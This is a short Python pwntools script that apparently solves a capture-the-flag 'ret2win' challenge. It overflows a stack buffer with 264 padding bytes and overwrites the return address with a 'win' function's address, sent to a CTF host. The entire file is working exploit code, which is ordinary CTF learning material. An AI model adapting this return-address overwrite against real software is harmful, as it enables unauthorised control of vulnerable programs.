#! /usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./out')
local = False
GDBSCPT = '''
'''
OFFSET = 264
# context.log_level="debug"

if local:
    conn = elf.process()
    # gdb.attach(conn, gdbscript=GDBSCPT)
else :
    host = 'ret2win.ctf.ingeniums.club'
    port = 1337
    conn = remote(host,port, ssl=True)


WIN = elf.symbols["win"] + 0x5
PADDING = b"A"*OFFSET
log.info('WIN: ' + hex(WIN))

payload = flat(PADDING,WIN)

conn.sendline(payload)
conn.interactive()
conn.close()
